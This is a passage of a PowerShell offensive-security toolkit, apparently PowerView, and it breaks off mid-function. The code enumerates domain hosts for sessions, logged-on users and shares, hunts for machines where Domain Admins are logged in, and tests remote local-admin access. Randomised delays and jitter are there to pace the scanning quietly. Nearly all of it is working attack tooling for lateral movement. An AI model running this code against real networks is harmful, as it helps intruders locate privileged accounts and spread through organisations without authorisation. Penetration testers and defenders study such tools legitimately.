        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]
        $HostName = 'localhost'
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }

    process {

        # process multiple object types
        $HostName = Get-NameField $HostName

        # 0xF003F - SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        $handle = $Advapi32::OpenSCManagerW("\\$HostName", 'ServicesActive', 0xF003F)

        Write-Debug "Invoke-CheckLocalAdminAccess handle: $handle"

        # if we get a non-zero handle back, everything was successful
        if ($handle -ne 0){
            # Close off the service handle
            $Advapi32::CloseServiceHandle($handle) | Out-Null
            $true
        }
        else{
            # otherwise it failed - get the last error
            $err = $Kernel32::GetLastError()
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx
            Write-Debug "Invoke-CheckLocalAdminAccess LastError: $err"
            $false
        }
    }
}


########################################################
#
# 'Meta'-functions start below
#
########################################################

function Invoke-Netview {
    <#
        .SYNOPSIS
        Queries the domain for all hosts, and retrieves open shares,
        sessions, and logged on users for each host.
        Original functionality was implemented in the netview.exe tool
        released by Rob Fuller (@mubix). See links for more information.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This is a port of Mubix's netview.exe tool. It finds the local domain name
        for a host using Get-NetDomain, reads in a host list or queries the domain
        for all active machines with Get-NetComputers, randomly shuffles the host list,
        then for each target server it runs  Get-NetSessions, Get-NetLoggedon,
        and Get-NetShare to enumerate each target host.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs enumerate.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludeShares
        Exclude common shares from display (C$, IPC$, etc.)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to enumerate for hosts.

        .EXAMPLE
        > Invoke-Netview
        Run all Netview functionality and display the output.

        .EXAMPLE
        > Invoke-Netview -Delay 60
        Run all Netview functionality with a 60 second (+/- *.3) randomized
        delay between touching each host.

        .EXAMPLE
        > Invoke-Netview -Delay 10 -HostList hosts.txt
        Runs Netview on a pre-populated host list with a 10 second (+/- *.3)
        randomized delay between touching each host.

        .EXAMPLE
        > Invoke-Netview -NoPing
        Runs Netview and doesn't pings hosts before eunmerating them.

        .EXAMPLE
        > Invoke-Netview -Domain testing
        Runs Netview for hosts in the 'testing' domain.

        .LINK
        https://github.com/mubix/netview
        www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $ExcludeShares,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # shares we want to ignore if the flag is set
        $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        # random object for delay
        $randNo = New-Object System.Random

        $currentUser = ([Environment]::UserName).toLower()

        "Running Netview with delay of $Delay"
        if ($targetDomain){
            "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        $DomainControllers = Get-NetDomainControllers -Domain $targetDomain | % {$_.Name}

        if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
            foreach ($DC in $DomainControllers){
                "[+] Domain Controller: $DC"
            }
        }
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count
        "[*] Total number of hosts: $HostCount"

        $counter = 0

        foreach ($server in $Hosts){

            $server = Get-NameField $server

            $counter = $counter + 1

            # make sure we have a server
            if (($server -ne $null) -and ($server.trim() -ne '')){

                $ip = Get-HostIP -hostname $server

                # make sure the IP resolves
                if ($ip -ne ''){
                    # sleep for our semi-randomized interval
                    Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                    Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"
                    "`r`n[+] Server: $server"
                    "[+] IP: $ip"

                    # get active sessions for this host and display what we find
                    $sessions = Get-NetSessions -HostName $server
                    foreach ($session in $sessions) {
                        $username = $session.sesi10_username
                        $cname = $session.sesi10_cname
                        $activetime = $session.sesi10_time
                        $idletime = $session.sesi10_idle_time
                        # make sure we have a result
                        if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $currentUser)){
                            "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                        }
                    }

                    # get any logged on users for this host and display what we find
                    $users = Get-NetLoggedon -HostName $server
                    foreach ($user in $users) {
                        $username = $user.wkui1_username
                        $domain = $user.wkui1_logon_domain

                        if ($username -ne $null){
                            # filter out $ machine accounts
                            if ( !$username.EndsWith("$") ) {
                                "[+] $server - Logged-on - $domain\\$username"
                            }
                        }
                    }

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        if ($share -ne $null){
                            $netname = $share.shi1_netname
                            $remark = $share.shi1_remark
                            $path = '\\'+$server+'\'+$netname

                            # check if we're filtering out common shares
                            if ($ExcludeShares){
                                if (($netname) -and ($netname.trim() -ne '') -and ($excludedShares -notcontains $netname)){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}

                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }

                                }
                            }
                            # otherwise, display all the shares
                            else {
                                if (($netname) -and ($netname.trim() -ne '')){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                }
                            }
                        }
                    }
                    
                }
            }
        }
    }
}


function Invoke-NetviewThreaded {
    <#
        .SYNOPSIS
        Queries the domain for all hosts, and retrieves open shares,
        sessions, and logged on users for each host.
        Original functionality was implemented in the netview.exe tool
        released by Rob Fuller (@mubix). See links for more information.
        Threaded version of Invoke-Netview. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This is a port of Mubix's netview.exe tool. It finds the local domain name
        for a host using Get-NetDomain, reads in a host list or queries the domain
        for all active machines with Get-NetComputers, randomly shuffles the host list,
        then for each target server it runs  Get-NetSessions, Get-NetLoggedon,
        and Get-NetShare to enumerate each target host.
        Threaded version of Invoke-Netview.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs enumerate.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludedShares
        Shares to exclude from output, wildcards accepted (i.e. IPC*)

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to enumerate for hosts.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-Netview
        Run all NetviewThreaded functionality and display the output.

        .EXAMPLE
        > Invoke-NetviewThreaded -HostList hosts.txt
        Runs Netview on a pre-populated host list.

        .EXAMPLE
        > Invoke-NetviewThreaded -ExcludedShares IPC$, PRINT$
        Runs Netview and excludes IPC$ and PRINT$ shares from output

        .EXAMPLE
        > Invoke-NetviewThreaded -NoPing
        Runs Netview and doesn't pings hosts before eunmerating them.

        .EXAMPLE
        > Invoke-NetviewThreaded -Domain testing
        Runs Netview for hosts in the 'testing' domain.

        .LINK
        https://github.com/mubix/netview
        www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string[]]
        $ExcludedShares,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads = 20
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        $currentUser = ([Environment]::UserName).toLower()

        "Running Netview with delay of $Delay"
        if($targetDomain){
            "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $CheckShareAccess, $ExcludedShares)

            $Server = Get-NameField $Server

            $ip = Get-HostIP -hostname $server

            # make sure the IP resolves
            if ($ip -ne ''){

                # optionally check if the server is up first
                $up = $true
                if($Ping){
                    $up = Test-Server -Server $Server
                }
                if($up){

                    "`r`n[+] Server: $server"
                    "[+] IP: $ip"

                    # get active sessions for this host and display what we find
                    $sessions = Get-NetSessions -HostName $server
                    foreach ($session in $sessions) {
                        $username = $session.sesi10_username
                        $cname = $session.sesi10_cname
                        $activetime = $session.sesi10_time
                        $idletime = $session.sesi10_idle_time
                        # make sure we have a result
                        if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $currentUser)){
                            "[+] $server - Session - $username from $cname - Active: $activetime - Idle: $idletime"
                        }
                    }

                    # get any logged on users for this host and display what we find
                    $users = Get-NetLoggedon -HostName $server
                    foreach ($user in $users) {
                        $username = $user.wkui1_username
                        $domain = $user.wkui1_logon_domain

                        if ($username -ne $null){
                            # filter out $ machine accounts
                            if ( !$username.EndsWith("$") ) {
                                "[+] $server - Logged-on - $domain\\$username"
                            }
                        }
                    }

                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        if ($share -ne $null){
                            $netname = $share.shi1_netname
                            $remark = $share.shi1_remark
                            $path = '\\'+$server+'\'+$netname

                            # check if we're filtering out common shares
                            if ($ExcludeCommon){
                                if (($netname) -and ($netname.trim() -ne '') -and ($excludedShares -notcontains $netname)){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}

                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }

                                }
                            }
                            # otherwise, display all the shares
                            else {
                                if (($netname) -and ($netname.trim() -ne '')){

                                    # see if we want to test for access to the found
                                    if($CheckShareAccess){
                                        # check if the user has access to this path
                                        try{
                                            $f=[IO.Directory]::GetFiles($path)
                                            "[+] $server - Share: $netname `t: $remark"
                                        }
                                        catch {}
                                    }
                                    else{
                                        "[+] $server - Share: $netname `t: $remark"
                                    }
                                }
                            }

                        }
                    }

                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $DomainControllers = Get-NetDomainControllers -Domain $targetDomain | % {$_.Name}

        if (($DomainControllers -ne $null) -and ($DomainControllers.count -ne 0)){
            foreach ($DC in $DomainControllers){
                "[+] Domain Controller: $DC"
            }
        }

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        "[*] Total number of hosts: $HostCount`r`n"

        foreach ($server in $Hosts){

            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CheckShareAccess', $CheckShareAccess).AddParameter('ExcludedShares', $ExcludedShares)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Invoke-UserView {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [Switch]
        $NoLoggedon,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $HostList,

        [Switch]
        $FileServers,

        [string]
        $HostFilter,

        [string]
        $Domain
    )
    Write-Warning "[!] Depreciated, use 'Invoke-UserHunter -ShowAll' for replacement functionality."
}


function Invoke-UserHunter {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroup or reads in a target user list, queries the domain for all
        active machines with Get-NetComputers or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER Filter
        The complete LDAP filter string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER StopOnSuccess
        Stop hunting after finding after finding a user.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER ShowAll
        Return all user location results, i.e. Invoke-UserView functionality.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups are
        logged into with a 60 second (+/- *.3) randomized delay between
        touching each host.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $UserList,

        [string]
        $Domain,

        [Switch]
        $ShowAll
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-UserHunter with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we get a specific username, only use that
        elseif ($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers += $UserName.ToLower()
        }
        # get the users from a particular OU if one is specified
        elseif($OU){
            $TargetUsers = Get-NetUser -OU $OU | ForEach-Object {$_.samaccountname}
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {$_.samaccountname}
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            # otherwise default to the group name to query for target users
            Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
            # lower case all of the found usernames
            $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return
        }
    }

    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            # make sure we get a server name
            if ($server -ne ''){
                $found = $false

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

                # get active sessions and see if there's a target user there
                $sessions = Get-NetSessions -HostName $server
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ($ShowAll -or $($TargetUsers -contains $username)){
                            $found = $true
                            $ip = Get-HostIP -hostname $Server

                            if($cname.StartsWith("\\")){
                                $cname = $cname.TrimStart("\")
                            }

                            $out = new-object psobject
                            $out | add-member Noteproperty 'TargetUser' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    if (($username -ne $null) -and ($username.trim() -ne '')){
                        # if the session user is in the target list, display some output
                        if ($ShowAll -or $($TargetUsers -contains $username)){
                            $found = $true
                            $ip = Get-HostIP -hostname $Server

                            $out = new-object psobject
                            $out | add-member Noteproperty 'TargetUser' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $Null

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $server
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }

                if ($StopOnSuccess -and $found) {
                    Write-Verbose "[*] User found, returning early"
                    return
                }
            }
        }
    }
}


function Invoke-UserHunterThreaded {
    <#
        .SYNOPSIS
        Finds which machines users of a specified group are logged into.
        Threaded version of Invoke-UserHunter. Uses multithreading to
        speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for users of a specified group (default "domain admins")
        with Get-NetGroup or reads in a target user list, queries the domain for all
        active machines with Get-NetComputers or reads in a pre-populated host list,
        randomly shuffles the target list, then for each server it gets a list of
        active users with Get-NetSessions/Get-NetLoggedon. The found user list is compared
        against the target list, and a status message is displayed for any hits.
        The flag -CheckAccess will check each positive host to see if the current
        user has local admin access to the machine.
        Threaded version of Invoke-UserHunter.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER Filter
        The complete LDAP query string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .PARAMETER ShowAll
        Return all user location results, i.e. Invoke-UserView functionality.

        .EXAMPLE
        > Invoke-UserHunter
        Finds machines on the local domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins are logged into.

        .EXAMPLE
        > Invoke-UserHunter -CheckAccess
        Finds machines on the local domain where domain admins are logged into
        and checks if the current user has local administrator access.

        .EXAMPLE
        > Invoke-UserHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt are logged in
        or have sessions.

        .EXAMPLE
        > Invoke-UserHunter -UserName jsmith -CheckAccess
        Find machines on the domain where jsmith is logged into and checks if
        the current user has local administrator access.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $UserName,

        [Switch]
        $CheckAccess,

        [Switch]
        $NoPing,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $UserList,

        [string]
        $Domain,

        [int]
        $MaxThreads = 20,

        [Switch]
        $ShowAll
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-UserHunterThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we get a specific username, only use that
        elseif ($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers += $UserName.ToLower()
        }
        # get the users from a particular OU if one is specified
        elseif($OU){
            $TargetUsers = Get-NetUser -OU $OU | ForEach-Object {$_.samaccountname}
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {$_.samaccountname}
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            # otherwise default to the group name to query for target users
            Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
            # lower case all of the found usernames
            $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return $Null
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $TargetUsers, $CurrentUser, $CurrentUserBase)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSessions -HostName $Server

                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

